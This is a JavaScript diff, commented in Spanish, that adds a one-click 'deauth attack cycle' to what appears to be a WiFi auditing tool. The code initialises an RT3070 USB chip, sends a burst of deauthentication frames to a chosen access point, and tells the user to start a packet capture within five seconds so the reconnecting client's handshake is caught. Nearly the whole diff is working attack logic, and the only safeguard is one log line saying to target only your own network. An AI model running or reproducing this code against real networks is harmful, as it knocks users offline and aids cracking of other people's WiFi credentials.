@@ -2083,3 +2083,54 @@ window.usbRawDeauth = async function () {
     return false;
   }
 };
+
+// ── Ataque deauth completo en un clic (ciclo con UNA antena) ─────────────
+// Estrategia realista con una sola RT3070:
+//   1) Chip en WinUSB → deauth al objetivo (el cliente se reconecta en 2-5 s)
+//   2) Revertir a netr28ux (restore_netr28ux.ps1) — la antena vuelve a ser WiFi
+//   3) La reconexión del cliente llega durante/tras el restore → captura Npcap
+// El usuario debe lanzar la captura Npcap (paso B) justo después del deauth.
+// NOTA: mientras el chip está en WinUSB, Npcap NO ve la antena. El deauth dura
+// ~2 s y el restore ~5 s: la ventana de captura es la reconexión posterior.
+window.usbRawAttackCycle = async function () {
+  const bssidInput = $('usbraw-bssid');
+  let bssid = bssidInput && bssidInput.value.trim();
+  if (!bssid) bssid = getSelectedBssid();
+  if (!bssid) { log('[ciclo] Selecciona un objetivo del escaneo (SOLO tu red).', 'warn'); return false; }
+  const chan = parseInt(($('usbraw-chan') || {}).value, 10) || (selectedChannel() || 11);
+  const count = parseInt(($('usbraw-deauth-count') || {}).value, 10) || 10;
+  const bx = $('usbraw-bssid'); if (bx && !bx.value) bx.value = bssid;
+  const line = $('usbraw-status');
+  const setSt = (t, ok) => { if (line) { line.textContent = 'Chip USB: ' + t; line.className = 'wiz-status' + (ok ? ' ok' : ' warn'); } };
+
+  setAttackRunning(true, 'Ciclo deauth USB en curso…');
+  try {
+    // 1) Estado + init (por si no estaba)
+    log('[ciclo] 1/4 Verificando chip WinUSB…', 'info');
+    const st = await window.__invoke('usb_raw_status');
+    if (!st.success) {
+      log('[ciclo] Chip no accesible: ' + st.message, 'error');
+      setSt('❌ ' + st.message, false);
+      return false;
+    }
+    log('[ciclo] 2/4 Init firmware + canal ' + chan + '…', 'info');
+    const ini = await window.__invoke('usb_raw_init', { channel: chan });
+    if (!ini.success) { log('[ciclo] Init falló: ' + ini.message, 'error'); setSt('❌ init', false); return false; }
+    log('[ciclo] 3/4 Deauth x' + count + ' → ' + bssid, 'warn');
+    const de = await window.__invoke('usb_raw_deauth', { bssid, channel: chan, count });
+    log('[ciclo] ' + de.message, de.success ? 'ok' : 'warn');
+    window.usbRawShow(de);
+    if (!de.success) { setSt('⚠️ deauth falló', false); return false; }
+
+    // 2) Aviso claro: AHORA capturar (el handshake llega al aire ya)
+    setSt('✅ deauth enviado — LANZA CAPTURA (paso B) ahora', true);
+    log('[ciclo] 4/4 AHORA: pulsa «Capturar (paso B)» en menos de 5 s — el cliente se está reconectando.', 'warn');
+    log('[ciclo] Cuando acabes, restaura la antena: driver_re/usb_tx/restore_netr28ux.ps1 (admin).', 'info');
+    return true;
+  } catch (e) {
+    log('[ciclo] error: ' + e, 'error');
+    return false;
+  } finally {
+    setAttackRunning(false);
+  }
+};
